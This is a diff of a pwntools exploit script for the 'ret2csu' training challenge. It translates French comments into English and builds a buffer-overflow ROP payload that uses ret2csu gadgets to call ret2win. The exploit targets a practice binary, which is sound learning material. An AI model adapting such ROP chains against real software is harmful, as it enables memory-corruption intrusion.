@@ -3,24 +3,24 @@
 from pwn import *
 import time
 
-# break a le fin de pwnme
+# break at the end of pwnme
 gs='''
 b *pwnme+150
 c
 '''
-
 
 # Set up pwntools for the correct architecture
 elf =  ELF('ret2csu')
 context.binary=elf
 # context(terminal=['tmux'])
 
-# Offset avant ecrasement de l'adresse de retour
+# Offset to the return adress
 offset=0x28
 
 ret2win=elf.plt['ret2win']
 
 g_poprdi=0x004006a3
+# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 gadget_1=0x0040069a
 gadget_2=0x00400680
 
@@ -37,18 +37,16 @@ if len(sys.argv)>1 and sys.argv[1] == "-d":
 [0x601018] pwnme  →  0x7ffff7dc793a
 [0x601020] ret2win  →  0x400516
 
-On vise 
+The target is :
 0x400510 <ret2win@plt>
 
-Il nous faut une adresse qui contienne 0x400510
-
-
+We need an address containing 0x400510
 '''
 
 PL =b"A"*offset
 PL+=p64(gadget_1)
-PL+=p64(0x0)                # brx
-PL+=p64(ret2win//8)         # rbp
+PL+=p64(0x0)                 # rbx
+PL+=p64(ret2win//8)          # rbp
 PL+=p64(0x0600e48)           # r12
 PL+=p64(0xdeadbeefdeadbeef)  # r13
 PL+=p64(0xcafebabecafebabe)  # r14
